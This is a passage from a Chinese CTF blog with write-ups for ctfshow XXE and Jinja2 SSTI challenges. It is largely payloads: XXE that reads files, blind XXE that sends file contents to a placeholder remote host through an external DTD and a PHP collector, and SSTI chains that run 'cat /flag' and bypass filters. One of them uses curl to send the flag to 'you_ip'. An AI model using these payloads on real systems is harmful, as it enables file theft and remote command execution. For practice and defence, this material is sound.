plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">[POST]Payload:<br><br>&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE payload [<br>&lt;!ELEMENT payload ANY&gt;<br>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;  //定义一个外部实体xxe<br>]&gt;<br>&lt;creds&gt;<br>&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><p>无回显xxe</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>我们只能将获得的数据通过服务器外带了。</p><p>我们需要使用 <code>参数实体</code> </p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ctfshow [<br>&lt;!ENTITY % remote SYSTEM &quot;http://ip/data.dtd&quot;&gt;<br>%remote;<br>]&gt;<br>&lt;demo&gt;123&lt;/demo&gt;<br></code></pre></td></tr></table></figure><p>data.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip/1.php?p=%file;&#x27;&gt;&quot;&gt; //只能在dtd文件中引用实体<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>首先通过在 payload内部定义dtd的地方调用参数实体 <code>%remote;</code> 然后就会相当于文件包含，将 <code>data.dtd</code> 内容包含进来，接着调用 <code>%int;</code> 此时会引入一个实体，由于其中存在 <code>%file;</code> 自动调用了该实体，并将值填入该位置，然后调用 <code>%send;</code> 向相应文件<code>1.php</code> 发送http请求，把flag保存在txt文件中</p><p><code>&amp;#x25; 是 % 为了避免冲突</code></p><h3 id="web375-376"><a href="#web375-376" class="headerlink" title="web375-376"></a>web375-376</h3><p>过滤了文档定义头： <code>preg_match(&#39;/&lt;\?xml version=&quot;1\.0&quot;/&#39;, $xmlfile)</code></p><p>我们可以直接去掉xml文档头:</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE ctfshow [<br>&lt;!ENTITY % remote SYSTEM &quot;http://ip/data.dtd&quot;&gt;<br>%remote;<br>]&gt;<br>&lt;demo&gt;123&lt;/demo&gt;<br></code></pre></td></tr></table></figure><h3 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h3><p>又把http过滤掉了，但是xml支持 UTF-16编码，我们可以将 xml编码为utf-16，这样就绕过了过滤：</p><p>我们使用python脚本发送post请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://9e8dfeb6-7cd8-4664-a58d-784a97a422bd.challenge.ctf.show/&quot;</span><br>xml = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE ctfshow [</span><br><span class="hljs-string">&lt;!ENTITY % remote SYSTEM &quot;http://ip/data.dtd&quot;&gt;</span><br><span class="hljs-string">%remote;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;demo&gt;123&lt;/demo&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>xml = xml.encode(<span class="hljs-string">&quot;utf-16&quot;</span>)<br>r = requests.post(url=url, data=xml)<br></code></pre></td></tr></table></figure><h3 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h3><p>最基本的回显xxe，直接外部实体引用即可</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_SSTI</title>
    <link href="/2023/08/24/ctfshow_SSTI/"/>
    <url>/2023/08/24/ctfshow_SSTI/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ctfshow【SSTI】"><a href="#ctfshow【SSTI】" class="headerlink" title="ctfshow【SSTI】"></a>ctfshow【SSTI】</h2><p><img src="https://s2.loli.net/2023/04/24/rYUZ1ajV2o5BL43.png" alt="ssti"></p><h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><p><img src="https://s2.loli.net/2023/04/24/1uZCF5s9Tp7qUJB.png" alt="image-20230424142934441"></p><p>首先get传参name，测试一下 <code>&#123;&#39;7&#39;*7&#125;</code>出现了7个7，代表这是python中的<code>jinja2模板</code></p><p>这一题没有过滤什么东西，有很多种姿势，hackbar中自带了一些ssti的payload</p><p><img src="https://s2.loli.net/2023/04/24/1aJIYiX2WlMN6P4.png" alt="image-20230424143729232"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].__getitem__(<span class="hljs-string">&quot;eval&quot;</span>)(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;<br><br>&#123;&#123;config.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].__getitem__(<span class="hljs-string">&quot;eval&quot;</span>)(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;<br><br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-string">&#x27;catch_warnings&#x27;</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].__getitem__(<span class="hljs-string">&quot;eval&quot;</span>)(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;<br><br>&#123;&#123;get_flashed_messages.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;url_for.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].__getitem__(<span class="hljs-string">&quot;eval&quot;</span>)(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p>还有很多种姿势</p><h3 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h3><p>把数字给过滤了，但是无所谓，上面的payload还是能用</p><h3 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h3><p>把引号给过滤了，那么我们就不能使用上面的姿势了，我们需要找一种新的方式，</p><p>我们可以尝试使用get传参：<code>request.args.xxx</code>，</p><p>这样可以使用get传入一个变量名为xxx的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.__getitem__(request.args.a).popen(request.args.b).read()&#125;&#125;&amp;a=os&amp;b=cat /flag<br><br>&#123;&#123;a.__init__.__globals__[request.args.x].<span class="hljs-built_in">eval</span>(request.args.y)&#125;&#125;&amp;x=__builtins__&amp;y=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;cat /flag&quot;</span>).read()<br><br>...<br></code></pre></td></tr></table></figure><h3 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h3><p>这一题把 <code>request.args</code>给过滤了，我们不能使用get传参，本来想用post传参的，但是不行，我们可以使用 <code>cookie传参</code>，<code>request.cookies.xxx</code></p><p><img src="https://s2.loli.net/2023/04/24/souZLwAVTdkhqnr.png" alt="image-20230424150938083"></p><h3 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h3><p>这一题过滤了中括号 <code>[]</code></p><p>我们可以不使用中括号取值的方式，</p><p>我们可以使用点 <code>.</code> 进行引用，或者使用 <code>__getitem__</code>取值</p><h3 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h3><p>这一题把下划线<code>_</code>也给过滤掉了，意味着我们无法调用 带有下划线<code>_</code>的方法了，我们必须使用其他的方法，这里我们使用过滤器：过滤器是通过<code>管道符号|</code>进行使用的</p><p>这里我们需要了解：<code>attr()</code>过滤器，这个过滤器可以获得前者的属性</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">cookie:</span><br><span class="language-xml">a=__globals__</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/04/26/m1pIQsMCk8oKtrF.png" alt="image-20230426171925983" style="zoom: 33%;" /><p>这里我们通过过滤器，成功获得 <code>lipsum</code>的<code>__globals__</code>属性（使用cookie传参的方式）</p><p><img src="https://s2.loli.net/2023/04/26/Z2S8srwEPQdiTIA.png" alt="image-20230426172618435"></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)).os.popen(<span class="hljs-name">request.cookies.b</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">a=__globals__;b=cat /flag</span><br></code></pre></td></tr></table></figure><p>注意使用os之前，要先用小括号括起来</p><h3 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h3><p>这一题把<code>os</code>给ban了，使用cookie传参就行</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)|attr(<span class="hljs-name">request.cookies.b</span>))(<span class="hljs-name">request.cookies.c</span>).popen(<span class="hljs-name">request.cookies.d</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">a=__globals__;b=__getitem__;c=os;d=cat /flag</span><br></code></pre></td></tr></table></figure><h3 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h3><p>这一题把 <code>&#123;&#123;&#125;&#125;</code>给过滤了，只能使用 <code>&#123;% %&#125;</code> 了，然后使用<code>print</code>将结果输出即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% <span class="hljs-built_in">print</span>((lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).<span class="hljs-built_in">read</span>()) %&#125;<br><br>a=__globals__;b=__getitem__;c=os;d=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/26/biuW5fTvHk8ZmQG.png" alt="image-20230426175246513"></p><h3 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h3><p><code>request</code>都被过滤了，前面的payload全部用不了了，我们需要设置变量，然后一个个构造出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> po=<span class="hljs-built_in">dict</span>(po=<span class="hljs-number">1</span>,p=<span class="hljs-number">1</span>)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> a=(()|select|string|<span class="hljs-built_in">list</span>)|attr(po)(<span class="hljs-number">24</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ini=(a,a,<span class="hljs-built_in">dict</span>(ini=<span class="hljs-number">1</span>,t=<span class="hljs-number">1</span>)|join,a,a)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> gloa=(a,a,<span class="hljs-built_in">dict</span>(glo=<span class="hljs-number">1</span>,bals=<span class="hljs-number">1</span>)|join,a,a)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> geti=(a,a,<span class="hljs-built_in">dict</span>(geti=<span class="hljs-number">1</span>,tem=<span class="hljs-number">1</span>)|join,a,a)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> buil=(a,a,<span class="hljs-built_in">dict</span>(buil=<span class="hljs-number">1</span>,tins=<span class="hljs-number">1</span>)|join,a,a)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c=(xx|attr(ini)|attr(gloa)|attr(geti))(buil) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=c.<span class="hljs-built_in">chr</span> %&#125;<br>&#123;% <span class="hljs-built_in">set</span> file=<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>)%2Bchr(<span class="hljs-number">97</span>)%2Bchr(<span class="hljs-number">116</span>)%2Bchr(<span class="hljs-number">32</span>)%2Bchr(<span class="hljs-number">47</span>)%2Bchr(<span class="hljs-number">102</span>)%2Bchr(<span class="hljs-number">108</span>)%2Bchr(<span class="hljs-number">97</span>)%2Bchr(<span class="hljs-number">103</span>) %&#125;  <span class="hljs-comment"># cat /flag</span><br>&#123;% <span class="hljs-built_in">print</span>(c) %&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">构造po=<span class="hljs-string">&quot;pop&quot;</span>     <span class="hljs-comment">#利用dict()|join拼接得到</span><br>&#123;% <span class="hljs-built_in">set</span> po=<span class="hljs-built_in">dict</span>(po=a,p=a)|join%&#125;<br><br>等效于a=(()|select|string|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">24</span>),即a等价于下划线_<br>&#123;% <span class="hljs-built_in">set</span> a=(()|select|string|<span class="hljs-built_in">list</span>)|attr(po)(<span class="hljs-number">24</span>)%&#125;<br><br>构造ini=<span class="hljs-string">&quot;___init__&quot;</span><br>&#123;% <span class="hljs-built_in">set</span> ini=(a,a,<span class="hljs-built_in">dict</span>(init=a)|join,a,a)|join()%&#125;<br><br>构造glo=<span class="hljs-string">&quot;__globals__&quot;</span><br>&#123;% <span class="hljs-built_in">set</span> glo=(a,a,<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">globals</span>=a)|join,a,a)|join()%&#125;<br><br>构造geti=<span class="hljs-string">&quot;__getitem__&quot;</span><br>&#123;% <span class="hljs-built_in">set</span> geti=(a,a,<span class="hljs-built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;<br><br>构造built=<span class="hljs-string">&quot;__builtins__&quot;</span><br>&#123;% <span class="hljs-built_in">set</span> built=(a,a,<span class="hljs-built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;<br><br>调用<span class="hljs-built_in">chr</span>()函数<br>&#123;% <span class="hljs-built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=x.<span class="hljs-built_in">chr</span>%&#125;<br><br>构造file=<span class="hljs-string">&#x27;/flag&#x27;</span><br>&#123;% <span class="hljs-built_in">set</span> file=<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)%2bchr(<span class="hljs-number">102</span>)%2bchr(<span class="hljs-number">108</span>)%2bchr(<span class="hljs-number">97</span>)%2bchr(<span class="hljs-number">103</span>)%&#125;<br></code></pre></td></tr></table></figure><h3 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h3><p>这一题把数字也给过滤了,我们可以使用count过滤器，计算出字符串中的位数，得到数字</p><p>open函数和popen函数有区别，popen函数可以执行命令，open函数只是想指定文件读取内容，不能执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> num=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %&#125;  <span class="hljs-comment"># 24</span><br>&#123;% <span class="hljs-built_in">set</span> f=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %&#125;  <span class="hljs-comment"># f的ascii码</span><br>&#123;% <span class="hljs-built_in">set</span> l=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> aa=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> g=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> gang=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> xx=(()|select|string|<span class="hljs-built_in">list</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> po=<span class="hljs-built_in">dict</span>(po=a,p=a)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> x=xx.pop(num) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ini=x~x~(<span class="hljs-built_in">dict</span>(ini=a,t=a)|join)~x~x %&#125;<br>&#123;% <span class="hljs-built_in">set</span> glob=x~x~(<span class="hljs-built_in">dict</span>(glo=a,bals=a)|join)~x~x %&#125;<br>&#123;% <span class="hljs-built_in">set</span> geti=x~x~(<span class="hljs-built_in">dict</span>(geti=a,tem=a)|join)~x~x %&#125;<br>&#123;% <span class="hljs-built_in">set</span> buil=x~x~(<span class="hljs-built_in">dict</span>(buil=a,tins=a)|join)~x~x %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c=((lipsum|attr(glob)|attr(geti))(buil)) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=c.<span class="hljs-built_in">chr</span> %&#125;<br>&#123;% <span class="hljs-built_in">set</span> file=<span class="hljs-built_in">chr</span>(gang)%2Bchr(f)%2Bchr(l)%2Bchr(aa)%2Bchr(g) %&#125;<br>&#123;% <span class="hljs-built_in">print</span>(c.<span class="hljs-built_in">open</span>(file).read())%&#125;<br></code></pre></td></tr></table></figure><h3 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h3><p>这一题把<code>print</code>给过滤掉了，没办法回显，只能考虑使用<code>curl命令外带</code>了，我们可以将数据外带到dns平台上面</p><p>这里生成了 <code>0~9</code> 的数字，然后巧妙的使用 ~ 进行字符串拼接，然后使用 <code>int 过滤器</code>转化为整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> c=(t|count)%&#125;  <span class="hljs-comment"># 0</span><br>&#123;% <span class="hljs-built_in">set</span> cc=(<span class="hljs-built_in">dict</span>(e=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccc=(<span class="hljs-built_in">dict</span>(ee=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccc=(<span class="hljs-built_in">dict</span>(eee=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccccc=(<span class="hljs-built_in">dict</span>(eeee=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccccc=(<span class="hljs-built_in">dict</span>(eeeee=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccccccc=(<span class="hljs-built_in">dict</span>(eeeeee=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccccccc=(<span class="hljs-built_in">dict</span>(eeeeeee=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccccccccc=(<span class="hljs-built_in">dict</span>(eeeeeeee=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccccccccc=(<span class="hljs-built_in">dict</span>(eeeeeeeee=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ccccccccccc=(<span class="hljs-built_in">dict</span>(eeeeeeeeee=a)|join|count)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cccccccccccc=(<span class="hljs-built_in">dict</span>(eeeeeeeeeee=a)|join|count)%&#125;  <span class="hljs-comment"># 10</span><br>&#123;% <span class="hljs-built_in">set</span> coun=(ccc~ccccc)|<span class="hljs-built_in">int</span>%&#125;<br>&#123;% <span class="hljs-built_in">set</span> po=<span class="hljs-built_in">dict</span>(po=a,p=a)|join%&#125;<br>&#123;% <span class="hljs-built_in">set</span> a=(()|select|string|<span class="hljs-built_in">list</span>)|attr(po)(coun)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> ini=(a,a,<span class="hljs-built_in">dict</span>(init=a)|join,a,a)|join()%&#125;<br>&#123;% <span class="hljs-built_in">set</span> glo=(a,a,<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">globals</span>=a)|join,a,a)|join()%&#125;<br>&#123;% <span class="hljs-built_in">set</span> geti=(a,a,<span class="hljs-built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;<br>&#123;% <span class="hljs-built_in">set</span> built=(a,a,<span class="hljs-built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;<br>&#123;% <span class="hljs-built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=x.<span class="hljs-built_in">chr</span>%&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd=<br>%&#125;<br>&#123;%<span class="hljs-keyword">if</span> x.<span class="hljs-built_in">eval</span>(cmd)%&#125;  <span class="hljs-comment"># 使用eval函数，执行curl命令进行外带</span><br>abc<br>&#123;%endif%&#125;<br></code></pre></td></tr></table></figure><p>cmd的参数我们使用脚本生成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">aaa</span>(<span class="hljs-params">t</span>):<br>t=<span class="hljs-string">&#x27;(&#x27;</span>+(<span class="hljs-built_in">int</span>(t[:-<span class="hljs-number">1</span>:])+<span class="hljs-number">1</span>)*<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;~&#x27;</span>+(<span class="hljs-built_in">int</span>(t[-<span class="hljs-number">1</span>])+<span class="hljs-number">1</span>)*<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;)|int&#x27;</span><br><span class="hljs-keyword">return</span> t<br>s=<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl http://you_ip?p=`cat /flag`&quot;).read()&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ccchr</span>(<span class="hljs-params">s</span>):<br>t=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br><span class="hljs-keyword">if</span> i&lt;<span 